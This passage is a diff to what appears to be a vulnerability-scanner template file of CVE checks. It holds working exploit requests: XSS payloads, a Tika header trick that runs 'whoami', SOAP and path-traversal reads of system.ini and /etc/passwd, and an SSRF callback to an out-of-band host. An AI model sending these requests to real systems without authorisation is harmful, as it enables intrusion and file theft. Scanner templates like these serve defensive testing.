@@ -5186,15 +5186,15 @@
     {
       "id": "CVE-2017-10075",
       "info": {
-        "name": "Oracle Content Server Cross-Site Scripting",
+        "name": "Oracle Content Server - Cross-Site Scripting",
         "severity": "high"
       },
       "requests": [
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=OO",
-            "{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E"
+            "{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>&dSecurityGroup=&QueryText=(dInDate+>=+%60<$dateCurrent(-7)$>%60)&PageTitle=OO",
+            "{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>"
           ]
         }
       ]
@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9691,7 +9691,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C"
+            "{{BaseURL}}/plus/pass_reset.php?L=english&pmc_username=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C"
           ]
         }
       ]
@@ -9938,7 +9938,7 @@
     {
       "id": "CVE-2019-3402",
       "info": {
-        "name": "Jira <8.1.1 - Cross-Site Scripting",
+        "name": "Jira < 8.1.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -12309,9 +12309,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -13316,15 +13316,13 @@
     {
       "id": "CVE-2020-6308",
       "info": {
-        "name": "Unauthenticated Blind SSRF in SAP",
+        "name": "SAP - Unauthenticated Blind SSRF",
         "severity": "medium"
       },
       "requests": [
         {
-          "body": "aps={{interactsh-url}}&usr=admin&pwd=admin&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp",
-          "method": "POST",
-          "path": [
-            "{{BaseURL}}/AdminTools/querybuilder/logon?framework="
+          "raw": [
+            "POST /AdminTools/querybuilder/logon?framework= HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naps={{interactsh-url}}&usr=anything&pwd=anything&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp\n"
           ]
         }
       ]
@@ -21117,6 +21115,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/goforms/rlminfo"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2863",
+      "info": {
+        "name": "WordPress WPvivid Backup < 0.9.76 - Local File Inclusion",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=WPvivid HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-admin/admin-ajax.php?_wpnonce={{nonce}}&action=wpvivid_download_export_backup&file_name=../../../../../../../etc/passwd&file_size=922 HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}/wp-admin/admin.php?page=WPvivid\n"
           ]
         }
       ]
